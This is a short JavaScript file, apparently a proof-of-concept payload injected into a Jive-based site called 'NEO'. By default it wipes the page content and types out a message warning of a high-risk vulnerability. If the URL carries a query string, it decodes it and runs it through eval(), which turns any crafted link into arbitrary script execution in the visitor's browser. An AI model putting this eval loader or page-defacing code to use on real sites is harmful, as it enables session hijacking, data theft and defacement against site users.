//Just for testing
//By kev7n

var i = 0;
var showString = "Hi There,|"
    + "|"
    + "If you see this page, it means that the NEO has security vulnerability.|"
    + "Please DO NOT worry, this won't have any malicious behavior, just a test.|"
    + "This is a very high risk level of vulnerability, Please fix it ASAP.|"
    + "Have a good day.|"
    + "By Kevin.";

function marquee() {
    var stringLength = showString.length;
    var eInput = document.getElementById('input');
    if(showString.charAt(i) === '|') {
        eInput.innerHTML += '<br/>';
        i += 1;
    }
    eInput.textContent += showString.charAt(i);
    i++;
    var timeID = setTimeout("marquee()", 70);
    if (i >= stringLength) {
        clearTimeout(timeID);
        i = 0;
    }
}

var queryString = document.location.search.substr(1);
if (!!queryString) {
    var cmd = decodeURIComponent(queryString);
    eval(cmd);
} else {
    var body = document.getElementsByClassName('jive-body-content')[0];
    body.innerHTML = '';
    body.style.background = 'black';
    body.innerHTML = '<br/><span id=\'input\' style=\'color:rgb(70, 221, 70);display:block; width:480px;\'></span>';
    marquee();
}
